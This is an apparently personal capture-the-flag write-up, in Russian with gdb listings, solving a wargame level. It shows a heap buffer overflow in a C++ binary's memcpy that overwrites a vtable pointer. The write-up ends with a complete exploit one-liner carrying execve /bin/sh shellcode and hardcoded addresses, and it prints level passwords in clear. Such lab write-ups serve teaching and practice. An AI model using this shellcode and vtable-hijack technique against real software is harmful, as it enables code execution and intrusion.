# su level9
# pass: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a

====
Уязвимость: memcpy переполнение, шеллкод и адреса
====

# ./level9 

**Поведение: ничего без аргументов и с ними тоже.**

# ltrace ./level9
__libc_start_main(0x80485f4, 1, 0xbffff804, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)          = 0
_exit(1 <unfinished ...>
+++ exited (status 1) +++

# i func
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini

# disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)                   1
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>            _exit(1)
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>           operator new(unsigned int)
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>           N::N(int)
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>           operator new(unsigned int)
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>           N::N(int)
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>   N::setAnnotation(char*)
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave  
   0x08048699 <+165>:   ret    
End of assembler dump.

утилитой из gdb можно попробовать перевести функции с++
# !c++filt _Znwj
operator new(unsigned int)

# disas 0x080486f6 (N::N(int))
Dump of assembler code for function _ZN1NC2Ei: 
   0x080486f6 <+0>:     push   %ebp
   0x080486f7 <+1>:     mov    %esp,%ebp
   0x080486f9 <+3>:     mov    0x8(%ebp),%eax
   0x080486fc <+6>:     movl   $0x8048848,(%eax)            0x8048848 <_ZTV1N+8>:        cmp    -0x78b1f7fc(%edi),%al (0x804873a <_ZN1NplERS_>)
   0x08048702 <+12>:    mov    0x8(%ebp),%eax
   0x08048705 <+15>:    mov    0xc(%ebp),%edx
   0x08048708 <+18>:    mov    %edx,0x68(%eax)
   0x0804870b <+21>:    pop    %ebp
   0x0804870c <+22>:    ret    
End of assembler dump.

# disas 0x0804870e (N::setAnnotation(char*))
Dump of assembler code for function _ZN1N13setAnnotationEPc:
   0x0804870e <+0>:     push   %ebp
   0x0804870f <+1>:     mov    %esp,%ebp
   0x08048711 <+3>:     sub    $0x18,%esp
   0x08048714 <+6>:     mov    0xc(%ebp),%eax
   0x08048717 <+9>:     mov    %eax,(%esp)
   0x0804871a <+12>:    call   0x8048520 <strlen@plt>
   0x0804871f <+17>:    mov    0x8(%ebp),%edx
   0x08048722 <+20>:    add    $0x4,%edx
   0x08048725 <+23>:    mov    %eax,0x8(%esp)
   0x08048729 <+27>:    mov    0xc(%ebp),%eax
   0x0804872c <+30>:    mov    %eax,0x4(%esp)
   0x08048730 <+34>:    mov    %edx,(%esp)
   0x08048733 <+37>:    call   0x8048510 <memcpy@plt>
   0x08048738 <+42>:    leave  
   0x08048739 <+43>:    ret

# disas 0x8048530 (operator new(unsigned int))
Dump of assembler code for function _Znwj@plt:
   0x08048530 <+0>:     jmp    *0x8049b70
   0x08048536 <+6>:     push   $0x40
   0x0804853b <+11>:    jmp    0x80484a0
End of assembler dump.

# disas 0x0804873a (N::operator+(N&))
Dump of assembler code for function _ZN1NplERS_:
   0x0804873a <+0>:     push   %ebp
   0x0804873b <+1>:     mov    %esp,%ebp
   0x0804873d <+3>:     mov    0x8(%ebp),%eax
   0x08048740 <+6>:     mov    0x68(%eax),%edx
   0x08048743 <+9>:     mov    0xc(%ebp),%eax
   0x08048746 <+12>:    mov    0x68(%eax),%eax
   0x08048749 <+15>:    add    %edx,%eax
   0x0804874b <+17>:    pop    %ebp
   0x0804874c <+18>:    ret    
End of assembler dump.

# disas 0x0804874e (N::operator-(N&))
Dump of assembler code for function _ZN1NmiERS_:
   0x0804874e <+0>:     push   %ebp
   0x0804874f <+1>:     mov    %esp,%ebp
   0x08048751 <+3>:     mov    0x8(%ebp),%eax
   0x08048754 <+6>:     mov    0x68(%eax),%edx      104
   0x08048757 <+9>:     mov    0xc(%ebp),%eax
   0x0804875a <+12>:    mov    0x68(%eax),%eax
   0x0804875d <+15>:    mov    %edx,%ecx
   0x0804875f <+17>:    sub    %eax,%ecx
   0x08048761 <+19>:    mov    %ecx,%eax
   0x08048763 <+21>:    pop    %ebp
   0x08048764 <+22>:    ret    
End of assembler dump

Создается два объекта (вызов конструктора). Объекты поддерживают арифметические операции между собой, а также можно записать некторую информацию в буфер (через аргумент).
В *%edx помещается адрес второго объекта, разыменовывается таблица виртуальных функций, а потом вызывается. По сути - двойное разыменование.
В асме это так - разыименовываем edx, там лежит eax, его разыменовываем
Нужно будет вызвать переполнение буфера через memcpy, нет проверки на ввод. Нигде нет вызовов систем или шелла, поэтому нужно будет добавить шеллкод.
Через memcpy перезапишем адрес таблицы виртуальных функций 2 объекта. Из-за второго разыменования, укажем не адрес таблицы, а адрес первой ячейки аннотации первого объекта, а в этой ячейке будет адрес второй, где начнется шеллкод.
Объекты в памяти расположены последовательно.


Найдем адрес начала для того, чтобы поместить в первый адрес возврата(0x804a00c):

# b *main+136
# run 'A'
# x $eax
0x804a00c:      0x00000041

Найдем адрес, чтобы перейти к шеллкоду:
Следующий адрес сдвинется на 4 байта, поэтому 
0x804a00c + 4 = 0x804a010

# x $esp
0xbffff710:     0x0804a008

# x/64wx 0x0804a008

0x804a008:      0x08048848      0x00000041      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000

Вместо 0x00000041 будет адрес на следующий адрес.

Теперь нужен шеллкод и оффсет:

(http://shell-storm.org/shellcode/files/shellcode-752.php)

Найдем оффсет(в кали):
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

# (gdb) r 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

# i reg eax
eax            **0x41366441**       1094083649

# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 41366441 
[*] Exact match at offset 108

108 офсет
4 адрес(0x804a010) + 21 шеллкод + 83 мусор + 4 адрес (0x804a00c)

# ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "A" * 83 + "\x0c\xa0\04\x08"')

# cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
